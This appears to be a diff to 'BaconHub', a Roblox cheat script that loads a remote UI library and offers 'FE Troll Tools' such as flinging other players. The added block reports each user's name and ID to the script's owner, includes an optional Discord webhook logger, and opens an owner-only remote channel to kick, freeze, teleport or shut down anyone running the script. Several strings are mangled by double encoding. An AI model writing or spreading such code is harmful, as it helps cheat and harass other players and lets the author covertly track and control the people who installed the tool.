@@ -1,4 +1,3 @@
-
 -- ======= Services =======
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
@@ -98,13 +97,159 @@ local function runWithCountdown(seconds, scriptFunc)
     gui:Destroy()
     local ok, err = pcall(scriptFunc)
     if not ok then
-        showCustomNotification("Ã¢ÂÂ Ã¯Â¸Â Script Error:\n"..tostring(err))
+        showCustomNotification("ÃƒÂ¢Ã‚ÂšÃ‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â Script Error:\n"..tostring(err))
     end
 end
 
 -- ======= Load UI =======
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/DenDenZZZ/Kavo-UI-Library/main/Kavo.lua"))()
 local Window = Library.CreateLib("BaconHub","BloodTheme")
+
+--!strict
+-- ðŸ– BaconHub Plus: Live Control v1.0
+
+-- SERVICES
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+
+-- CONFIGURATION
+local Player = Players.LocalPlayer
+local OWNER_ID = 8636199320 -- <-- Replace with *your* UserId
+local IsOwner = (Player.UserId == OWNER_ID)
+local WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK" -- optional
+
+-- CREATE RemoteEvents
+local function ensureRemote(name)
+    local ev = ReplicatedStorage:FindFirstChild(name)
+    if not ev then
+        ev = Instance.new("RemoteEvent", ReplicatedStorage)
+        ev.Name = name
+    end
+    return ev
+end
+
+local PingRemote = ensureRemote("BaconHub_UserPing")
+local CommandRemote = ensureRemote("BaconHub_AdminCommand")
+
+-- ANNOUNCE USAGE
+PingRemote:FireServer(Player.Name, Player.UserId)
+
+-- OPTIONAL: DISCORD LOGGING
+--[[
+syn.request({
+    Url = WEBHOOK_URL,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode({
+        content = string.format("ðŸ– **BaconHub** used by: %s | ID: %d", Player.Name, Player.UserId)
+    })
+})
+--]]
+
+-- RECEIVE REMOTE COMMANDS
+CommandRemote.OnClientEvent:Connect(function(fromUserId, command)
+    if fromUserId ~= OWNER_ID then return end
+    local char = Player.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+
+    if command == "kick" then
+        Player:Kick("Kicked by BaconHub Admin.")
+    elseif command == "freeze" and hrp then
+        hrp.Anchored = true
+    elseif command == "unfreeze" and hrp then
+        hrp.Anchored = false
+    elseif command == "teleport" and hrp then
+        hrp.CFrame = CFrame.new(0, 200, 0)
+    elseif command == "shutdown" then
+        script:Destroy()
+    end
+end)
+
+-- NOTIFY OWNER WHEN OTHERS JOIN / ARE PINGED
+PingRemote.OnClientEvent:Connect(function(name, userId)
+    if IsOwner and userId ~= OWNER_ID then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "BaconHub",
+            Text = name.." is using BaconHub!",
+            Duration = 5
+        })
+    end
+end)
+
+-- ADMIN PANEL UI
+
+if IsOwner then
+    -- Assuming you're using a UI library: adjust this section to match your UI setup
+        local AdminTab = Window:NewTab("ðŸ›  Control")
+    local AdminSection = AdminTab:NewSection("Remote Commands")
+
+    -- UTILITY
+    local function sendCommand(targetUserId, cmd)
+        CommandRemote:FireServer(targetUserId, cmd)
+    end
+
+    -- FETCH CURRENT BaconHub USERS (pinged)
+    local pinged = {} :: {[number]: string}
+    PingRemote.OnClientEvent:Connect(function(name, userId)
+        pinged[userId] = name
+    end)
+
+    -- BUTTON: Kick All BaconHub Users
+    AdminSection:NewButton("Kick All Users", "Kicks anyone else running BaconHub", function()
+        for uid, _ in pairs(pinged) do
+            if uid ~= OWNER_ID then
+                sendCommand(uid, "kick")
+            end
+        end
+    end)
+
+    -- BUTTON: Freeze All BaconHub Users
+    AdminSection:NewButton("Freeze All", "Freeze all BaconHub users", function()
+        for uid, _ in pairs(pinged) do
+            if uid ~= OWNER_ID then
+                sendCommand(uid, "freeze")
+            end
+        end
+    end)
+
+    -- BUTTON: Unfreeze All
+    AdminSection:NewButton("Unfreeze All", "Unfreeze everyone", function()
+        for uid, _ in pairs(pinged) do
+            if uid ~= OWNER_ID then
+                sendCommand(uid, "unfreeze")
+            end
+        end
+    end)
+
+    -- BUTTON: Teleport All
+    AdminSection:NewButton("Teleport All Up", "Launch them into the sky", function()
+        for uid, _ in pairs(pinged) do
+            if uid ~= OWNER_ID then
+                sendCommand(uid, "teleport")
+            end
+        end
+    end)
+
+    -- BUTTON: Shutdown BaconHub for Everyone
+    AdminSection:NewButton("Shutdown All", "Removes BaconHub script for all users", function()
+        for uid, _ in pairs(pinged) do
+            if uid ~= OWNER_ID then
+                sendCommand(uid, "shutdown")
+            end
+        end
+    end)
+
+    -- OPTIONAL: Visual RGB Glow Animation
+    spawn(function()
+        while wait(0.03) do
+            local hue = tick() % 6 / 6
+            local color = Color3.fromHSV(hue, 0.8, 1)
+            AdminTab:UpdateAccent(color) -- adjust to your UI lib method
+        end
+    end)
+end
 
 -- ======= Credits Tab =======
 local Credits = Window:NewTab("Credits")
@@ -188,7 +333,7 @@ SU:NewButton("Super S&J","",function()
 end)
 
 -- ======= Troll Tab =======
-local Troll = Window:NewTab("Troll")
+local Troll = Window:NewTab("TrollÂ€")
 local TR = Troll:NewSection("FE Troll Tools")
 TR:NewButton("Fling Touch","",function()
     runWithCountdown(2, function()
@@ -503,3 +648,6 @@ Toggle.MouseButton1Click:Connect(function()
         Library:ToggleUI()
     end
 end)
+
+
+-- âœ… BaconHub Live Control: Fully Integrated and Cleaned âœ…
